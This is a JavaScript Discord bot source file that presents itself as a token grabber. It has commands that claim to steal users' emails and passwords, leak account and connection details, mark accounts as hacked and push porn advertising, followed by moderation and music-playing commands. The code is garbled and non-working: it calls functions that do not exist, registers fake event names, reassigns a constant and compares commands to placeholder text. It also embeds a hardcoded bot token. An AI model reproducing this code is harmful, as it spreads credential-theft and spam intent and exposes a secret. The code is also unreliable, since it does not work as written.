const discord = require("discord.js")
const { userInfo } = require("os")
const Client = new discord.Client()
Client.on("ready", () => {
  console.log("Logged in as $",{Client, user, tag},"!")
});

const data = tokengrabber.joinclient(discord)
Client.login("MTE3NTY0MDM1NjE5MzMyNTEwNg.G52mx3.jrfxfbCkHG0DNCwuZK7x-BhDzj0RBsFWt2ZZGY")
console.log(data)

Client.on("infect all", msg => {
  if (msg.content === "!infectall") {
    msg.reply("infected all stealed email:", {Client, find, email}, "");
    msg.reply("Infected all stealed password:", {Client, find, password}, "");
  };
});

discord.findemail(userInfo)
discord.findpassword(userInfo)
Client.on("leak", msg => {
  if (msg.content === "!leak")
    msg.reply("leaked info user:",{Client, URL, Find})
    msg.reply("leaked info connection",{Client, ConnectionAccount, Find})
})

const status = discord.statusaccount(discordaccount)
status = account
Client.on("status", msg => {
  if (msg.content === "!status")
    msg.reply("status everyone account: hacked")
})

const bot = request(http, "ads")
const RandomHttp = require(bot)
Client.on(bot, msg => {
  if ("ads" === bot)
    // Ads Poped Everyone Who Watch Porn
    msg.reply("Watch Porn For Free:", {Client, URL, Porn,  RandomHttp, bot} ,"!")
  else if ("ads" === bot)
    // And Now It WilL Random Text To Everyone Who See Add
    msg.reply(RandomAdsText, {Client, URL, Ads})
});

Client.on("Punch", msg => {
  if (msg.content === "!punch")
    msg.reply("Punched User:", {Client, User, Account})
});

Client.on("slap", msg => {
  if (msg.content === "!slap") {
    msg.reply("Slapped User:", {Client, User, Account});
  }
});

const fetch = require('node-fetch');
Client.on("wget", msg => {
  if (msg.content === "!wget <website-url>") {
    fetch("<website-url>")
      .then(res => res.text())
      .then(body => {
        msg.reply("Website content:", body);
      });
  }
});

Client.on("ban", msg => {
  if (msg.content === "!ban <user-id>") {
    const userId = msg.content.split(" ")[1];
    const user = Client.users.cache.get(userId);
    if (user) {
      user.ban();
      msg.reply(`User with ID ${userId} has been banned.`);
    } else {
      msg.reply(`User with ID ${userId} not found.`);
    }
  }
});

Client.on("kick", msg => {
  if (msg.content === "!kick <user-id>") {
    const userId = msg.content.split(" ")[1];
    const user = Client.users.cache.get(userId);
    if (user) {
      user.kick();
      msg.reply(`User with ID ${userId} has been kicked.`);
    } else {
      msg.reply(`User with ID ${userId} not found.`);
    }
  }
});

Client.on("unban", msg => {
  if (msg.content === "!unban <user-id>") {
    const userId = msg.content.split(" ")[1];
    Client.users.unban(userId);
    msg.reply(`User with ID ${userId} has been unbanned.`);
  }
});

Client.on("unkick", msg => {
  if (msg.content === "!unkick <user-id>") {
    const userId = msg.content.split(" ")[1];
    Client.users.unban(userId);
    msg.reply(`User with ID ${userId} has been un-kicked.`);
  }
});

const ytdl = require('ytdl-core');
Client.on("play", async msg => {
  if (msg.content.startsWith("!play")) {
    const args = msg.content.split(" ");
    if (args.length > 1) {
      const voiceChannel = msg.member.voice.channel;
      if (voiceChannel) {
        const connection = await voiceChannel.join();
        const url = args[1];
        connection.play(ytdl(url, { filter: 'audioonly' }));
        msg.reply(`Now playing: ${url}`);
      } else {
        msg.reply("You need to be in a voice channel to play music!");
      }
    } else {
      msg.reply("Please provide a valid URL to play music from!");
    }
  }
});
